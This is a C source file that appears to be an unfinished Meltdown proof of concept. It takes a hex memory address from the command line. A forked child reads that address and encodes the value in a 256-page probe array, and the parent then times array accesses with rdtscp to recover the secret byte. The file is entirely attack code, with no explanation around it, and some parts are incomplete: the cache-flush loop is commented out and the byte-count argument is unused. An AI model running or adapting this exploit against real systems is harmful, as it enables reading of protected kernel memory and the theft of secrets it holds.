#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <x86intrin.h>

void readFromMemory(uint8_t *target_addr)
{
    uint8_t array[256*4096];
    register uint64_t time1, time2;
    //uint8_t *mdbyte = base_addr;

/*
    for (uint16_t i = 0; i < 2048; i++)
    {
	_mm_clflush(&array[i*512]);
    }
//*/
    printf("Test indexing %c\n", array['G'*4096]);


///*
    pid_t the_child_1;
    uint8_t result = 0; 
    uint8_t helper;
    the_child_1 = fork();

    if (the_child_1==0)
    {
	printf("Reading from memory address %p\n", target_addr);
	result = *target_addr;
	helper = array[4096*result];
	printf("This should not be reached, result = %u = %c, helper = %u\n", result, result, helper);
	exit(0);
    }
//*/

    volatile uint8_t *addr;
    unsigned int junk = 0;
    for (uint16_t j = 1; j < 255; j++)
    {
	addr = &array[j*4096];
	time1 = __rdtscp(&junk);
	junk = *addr;
	time2 = __rdtscp(&junk) - time1;
	if (time2 < 1000)
	    printf("%u = %c -> %u \t", j, (uint8_t) j, (uint32_t) time2);
    }
    putchar('\n');
    
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
	printf("%s", "Usage: \"meltdown <memory address in hex> <amount of bytes to read>\"");
	exit(1);
    }

    uint8_t *base_addr = (uint8_t*) strtol(argv[1], NULL, 16);
    uint8_t bytec = (uint8_t) atoi(argv[2]);

    printf("Reading %u bytes from memory address %p\n", bytec, base_addr);

    readFromMemory(base_addr);
    //readFromMemory(base_addr+1);

    return 0;
}
